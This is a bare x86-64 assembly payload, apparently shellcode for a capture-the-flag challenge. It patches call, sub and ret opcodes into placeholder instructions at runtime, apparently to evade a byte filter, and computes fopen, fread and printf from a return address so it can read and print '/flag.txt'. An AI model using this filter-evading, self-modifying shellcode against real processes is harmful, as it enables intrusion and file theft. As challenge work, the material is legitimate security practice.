;save rdx
mov r15,rdx

;call rdx
mov word [r15+0xA1],0xD0FF
mov word [r15+0xBD],0xD0FF
mov word [r15+0xCC],0xD0FF

;lea rsi,[r15+10]
mov dword [r15+0x93],0x0A778D49

;sub rax,0x176 #fread
mov dword [r15+0xB7],0x01762D48
mov word [r15+0xBB],0

;sub rax,0x126 #fopen
mov dword [r15+0x9B],0x01262D48
mov word [r15+0x9F],0

;sub rax,0x186 #printf
mov dword [r15+0xC6],0x01862D48
mov word [r15+0xCA],0

;ret
mov byte [r15+0xCE],0xC3

;"flag.txt"
mov dword [r15],'/fla'
mov dword [r15+4],'g.tx'
mov word [r15+8],`t\0`

;"r"
mov word [r15+10],`r\0`


mov rdi,r15
;dummy lea rsi
mov ax,0x1234
;dummy call fopen
mov rax,[rsp]
mov     rax, rbx
mov     rax, rbx
mov eax,ebx

mov rcx,rax
mov esi,1
mov edx,40
mov rdi,r15
;dummy call fread
mov rax,[rsp]
mov     rax, rbx
mov     rax, rbx
mov eax,ebx

mov rdi,r15
;dummy call printf & ret
mov rax,[rsp]
mov     rax, rbx
mov     rax, rbx
mov rax,rbx